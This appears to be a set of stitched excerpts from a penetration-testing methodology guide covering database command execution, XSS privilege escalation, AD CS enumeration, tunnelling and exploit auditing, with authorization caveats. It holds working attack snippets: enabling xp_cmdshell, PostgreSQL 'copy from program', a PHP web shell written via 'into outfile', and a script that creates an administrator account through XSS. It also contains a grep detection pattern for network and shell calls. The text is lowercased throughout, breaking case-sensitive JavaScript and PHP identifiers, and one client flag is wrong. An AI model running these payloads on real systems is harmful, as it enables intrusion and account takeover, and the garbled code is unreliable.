## mysql / mariadb

```bash
mysql -h target -p port -u user -p
```

```sql
select version(), user(), current_user();
show databases;
show grants;
use database;
show tables;
describe table;
select * from table limit 20;
select @@secure_file_priv;
```

> **interpret:** `user()` shows the presented client identity; `current_user()` shows the account used for privilege checking. `secure_file_priv` restricts server-side import/export: a directory constrains it, an empty value is unrestricted by that variable, and `null` disables these operations. the `file` privilege is still required.

<details>
<summary><strong>mysql variant — validate server-side file read/write prerequisites</strong></summary>

```sql
select load_file('/path/on/database/server');
select 'probe' into outfile '/allowed/server/path/probe.txt';
```

use only an authorized harmless path. `load_file` returning `null` is ambiguous among missing file, permissions, size, file privilege and `secure_file_priv`. `into outfile` will not overwrite an existing file. a written file becomes execution only if another privileged component consumes it.

</details>

## microsoft sql server

```bash
impacket-mssqlclient 'user@target'
impacket-mssqlclient 'domain/user@target' -windows-auth
```

let the tool prompt for the password. at the sql prompt:

```sql
select @@version;
select system_user;
select is_srvrolemember('sysadmin');
select name from sys.databases;
use database;
select table_schema, table_name from information_schema.tables;
select top 20 * from schema.table;
```

> **interpret:** `is_srvrolemember('sysadmin')` returns `1`, `0` or `null`; `null` is not success. impacket also exposes helpers such as `enum_impersonate` and `xp_cmdshell` depending on version and rights.

<details>
<summary><strong>mssql variant — command-execution boundary</strong></summary>

```sql
exec xp_cmdshell 'whoami';
```

`xp_cmdshell` is disabled by default on new installations. enabling it generally requires high privilege and changes server configuration; do not enable it merely to enumerate. when available, a sysadmin's child process normally runs as the sql server service account; an authorized non-sysadmin may use a configured proxy. verify returned identity before choosing the next action.

</details>

## exit and handoffs

> **exit condition:** each interesting function has a baseline request, access context, controllable input, expected result, observed difference and cheapest next test.

- file/path selector -> [file handling attacks](../03-initial-access/02-web-file-handling.md);
- shell/diagnostic or database-backed input -> [command and sql injection](../03-initial-access/03-command-and-sql-injection.md);
- object/role/property or browser-script context -> [access control and xss](../03-initial-access/04-access-control-and-xss.md);
- product/plugin/version exploit candidate -> block 6 public-exploit adaptation;
- new credential -> block 5 credential handling and authenticated re-enumeration;
- verified server command execution -> block 7 session handling.

## exit and next action

- file/source/credential disclosure -> block 5 and authenticated re-enumeration;
- verified web command execution -> record `whoami`/`id`, hostname and working directory, then block 7;
- write without execution -> identify the privileged consumer/trigger or retain it as a chain primitive;
- product-specific handler/cve requirement -> block 6;
- no decisive result -> return to the [web behavior map](../02-service-enumeration/10-http-web-mapping.md) with the exact disproven context.

## database control to operating-system effect

this is a new transition, not an automatic consequence of sql injection. verify the dbms identity, database role, feature state, filesystem permissions and path or egress assumptions first.

<details>
<summary><strong>mssql — xp_cmdshell when privilege and policy allow</strong></summary>

```sql
exec sp_configure 'show advanced options', 1;
reconfigure;
exec sp_configure 'xp_cmdshell', 1;
reconfigure;
exec xp_cmdshell 'whoami';
```

requires sufficient server privilege; enabling it changes server configuration. prefer a direct proof when it is already enabled. verify the windows service identity returned by `whoami`.

</details>

<details>
<summary><strong>postgresql — copy program when role and version allow</strong></summary>

```sql
drop table if exists cmd_output;
create table cmd_output(line text);
copy cmd_output from program 'id';
select * from cmd_output;
```

requires a superuser or a role such as `pg_execute_server_program`; the command runs under the database service account.

</details>

<details>
<summary><strong>mysql/mariadb — file write as a separate primitive</strong></summary>

```sql
select '<?php echo shell_exec($_get["cmd"]); ?>'
into outfile '/confirmed/webroot/check.php';
```

requires `file` privilege, a permitted `secure_file_priv` destination, a known writable webroot and php execution there. verify the file through http, then verify execution. if it only displays or downloads, only file write is proven.

</details>

## failure-guided decisions

- quote causes generic error only -> compare true/false and inspect whether the application, proxy or waf generated it;
- `union` always errors -> recheck context, column count, types, parentheses and comment syntax;
- blind pages differ randomly -> find a stable marker or repeat timing controls before continuing;
- command payload is reflected -> no execution proof; compare command-derived output or side effect;
- command executes but callback fails -> keep execution confirmed and diagnose listener, route, payload and egress separately in block 7;
- database identity lacks the required role/feature -> retain data access and search extracted configuration/credentials rather than assuming os execution.

## handoffs

- extracted password/hash/key/token -> block 5 with source and identity context;
- exact vulnerable product/version or stored procedure requirement -> block 6;
- verified os command -> block 7 session handling;
- file write into web content -> [web file handling](02-web-file-handling.md);
- useful application account/role -> remap authenticated behavior in block 3.

## turn xss into useful application privilege

`httponly` prevents javascript from reading that cookie, but same-origin xss may still issue authenticated requests from the victim browser. recreate a legitimate privileged workflow and obtain its anti-csrf value first:

```javascript
fetch('/admin/users/new')
  .then(r => r.text())
  .then(t => {
    const token = new domparser().parsefromstring(t, 'text/html')
      .queryselector('input[name="csrf"]')?.value;
    return fetch('/admin/users', {
      method: 'post',
      headers: {'content-type': 'application/x-www-form-urlencoded'},
      body: new urlsearchparams({username:'new_user', password:'new_password', role:'administrator', csrf:token})
    });
  });
```

> **prerequisites:** the payload is rendered by a suitably privileged victim, under the correct origin; the paths/fields come from captured normal behavior; csp and application logic allow execution; the action is permitted in the victim session.

> **verification:** authenticate as `new_user` and perform one administrator-only action. if application administration exposes a legitimate plugin/template/file-upload function, continue with [web file handling](02-web-file-handling.md) and re-prove server execution.

## failure cues

- input appears encoded as `&lt;...&gt;`: output encoding worked in that context;
- script runs only for the tester: reflected/self-xss without a delivery/viewer path;
- stored marker exists but script never runs: wrong render context, sanitization or csp;
- cookie cannot be read: check `httponly`, but do not infer that authenticated same-origin requests are blocked;
- privileged request returns success text but no state changes: token/field/role may be wrong; verify independently;
- user a reads only a's data after id change: object-level control held in that tested context.

## handoffs

- new password/token/account -> block 5 plus authenticated block 3 mapping;
- product/plugin feature requiring public code -> block 6;
- admin upload/template editor -> [web file handling](02-web-file-handling.md);
- verified server command execution -> block 7;
- no useful viewer/action -> record xss proof and return to higher-priority server-side inputs.

## audit untrusted code before execution

start with metadata and readable text:

```bash
file exploit_file
sha256sum exploit_file
sed -n '1,240p' exploit_file
grep -nei 'sudo|setuid|chmod|chown|rm |unlink|remove|subprocess|system\(|popen|exec\(|socket|connect|requests|curl|wget|powershell|cmd\.exe|/bin/(ba)?sh|http://|https://' exploit_file
```

for binaries, prefer obtaining inspectable source. if only a binary exists, treat it as a substantially higher-risk choice:

```bash
file exploit_binary
sha256sum exploit_binary
strings -a exploit_binary | less
objdump -f exploit_binary
```

audit for:

- unexpected privilege requirements on the attacking host;
- destructive file/process/service operations or denial of service;
- downloads, callbacks or telemetry to third parties;
- embedded credentials, tokens, commands or payloads;
- files written or overwritten and their cleanup behavior;
- hard-coded target addresses, ports, paths, virtual hosts and callback values;
- authentication, cookie, csrf, redirect, tls and proxy assumptions;
- target os, architecture, runtime, library and payload assumptions;
- success messages that are printed without verifying the claimed effect.

> **safety cue:** use source, a disposable environment and a clean snapshot when uncertainty remains. do not grant `sudo` merely because an unknown poc requests it.

## handle security-control evidence proportionately

windows defender status, when the current identity can query it:

```powershell
get-mpcomputerstatus |
  select-object antivirusenabled,realtimeprotectionenabled,behaviormonitorenabled,ioavprotectionenabled
```

do not label every failure “av.” differentiate:

- file never arrived or hashes differ;
- file arrived and disappeared/quarantined;
- process creation was denied;
- script content was blocked;
- process started and exited/crashed;
- callback was blocked after execution;
- application-control or language-mode restrictions;
- ordinary format, architecture, permission or dependency errors.

prefer an already available native or authenticated route when it satisfies the objective. encoding is transport representation, not proof of evasion. custom shellcode development and deep av-bypass work are outside this unit.

for motw/office/library-file delivery, execution-policy precedence, amsi/applocker/defender evidence and restricted metasploit module/session handling, continue with [payload execution obstacles](06-payload-execution-obstacles.md).

## 12. evidence and cleanup

record:

- source and hash of the original artifact or exploit;
- exact changes and payload-generation command;
- delivery path and resulting hash;
- required user/trigger action;
- os, process architecture, format and runtime assumptions;
- handler payload, bind and route;
- security-control errors/events used for diagnosis;
- verified host, identity and session type;
- listener/job/process/artifact cleanup.

remove temporary documents, shortcuts, webdav content, payloads, handler jobs and policy changes created for the authorized exercise. do not claim av evasion, user execution or a session without observed evidence.

## 13. candidate ledger and path ranking

```text
id | controlled principal | relationship | target | source evidence
   | effective? | route/service | volatility | expected transition
   | minimum validation | status | next block
```

rank candidates by:

1. confidence that the relationship is effective;
2. deterministic value of the resulting identity/access;
3. route and service availability;
4. stability versus volatile session timing;
5. reversibility and impact;
6. number of unsupported assumptions.

prefer a validated readable share/credential clue or direct object right over a multi-edge path built from stale sessions and unreachable hosts.

### common failures

- no spns returned: wrong domain/base/authentication context, filtering or no user spns;
- `kdc_err_s_principal_unknown`: spn is absent/malformed or queried in the wrong realm;
- `kdc_err_etype_nosupp`: requested cipher conflicts with account/domain policy;
- output wraps or fails to load: save directly to an output file and verify prefix/line integrity;
- crack exhausts candidates: password not represented by the tested model; the account is not therefore “secure.”

## conditional: ad cs enumeration

> **prerequisite:** reachable ca/dc and a valid domain identity. **decisive output:** a ca/template whose enabled state, enrollment rights and configuration satisfy a specific esc path.

package names vary:

```bash
command -v certipy-ad || command -v certipy
certipy-ad find -u 'user@domain' -p 'password' -dc-ip dc_ip \
  -enabled -vulnerable -stdout
```

review:

- ca name and host;
- template name and whether it is enabled/published;
- who can enroll;
- client-authentication ekus/purpose;
- subject/san supply controls;
- manager approval/signature requirements;
- template owner and modification rights;
- web enrollment/relay-related configuration where relevant.

an `esc` label is a candidate classification. manually validate the properties and the controlled identity's effective rights.

## 13. multi-hop routes

for every additional hop, write another complete segment:

```text
kali -> tunnel a -> pivot_a -> tunnel b -> pivot_b -> internal_host:port
```

rules:

- validate one hop before adding the next;
- avoid overlapping local/vpn/internal routes;
- use unique listener and socks ports;
- record which session owns each route;
- ensure the deeper agent/client can reach the upstream listener;
- re-evaluate dns and callback direction at every hop;
- prefer a routed method for several deep services instead of stacking many opaque wrappers.

an upstream tunnel failure invalidates every deeper observation. do not troubleshoot target credentials until the complete path is restored.

## public exploit evidence

for an unmodified exploit, retain its source url rather than pasting pages of code. for a modified exploit, retain:

- original url and version/commit;
- local modified copy;
- a focused diff/highlight of changes;
- why each change was necessary;
- build/interpreter command and dependencies;
- payload-generation command, if any; and
- exact execution and result verification.

```bash
git diff --no-index original.py modified.py > exploit-changes.diff
sha256sum original.py modified.py
```
